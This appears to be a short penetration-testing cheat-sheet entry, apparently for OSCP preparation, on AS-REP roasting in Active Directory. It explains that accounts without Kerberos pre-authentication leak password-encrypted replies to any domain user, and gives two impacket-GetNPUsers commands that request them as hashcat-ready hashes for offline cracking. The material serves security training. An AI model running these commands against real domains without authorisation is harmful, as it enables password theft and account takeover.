It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the accountâ€™s password, and any domain user can request it
```bash
impacket-GetNPUsers -dc-ip <IP> -request  oscp.exam/-format hashcat
impacket-GetNPUsers oscp.exam/user -dc-ip <IP> -format hashcat
```
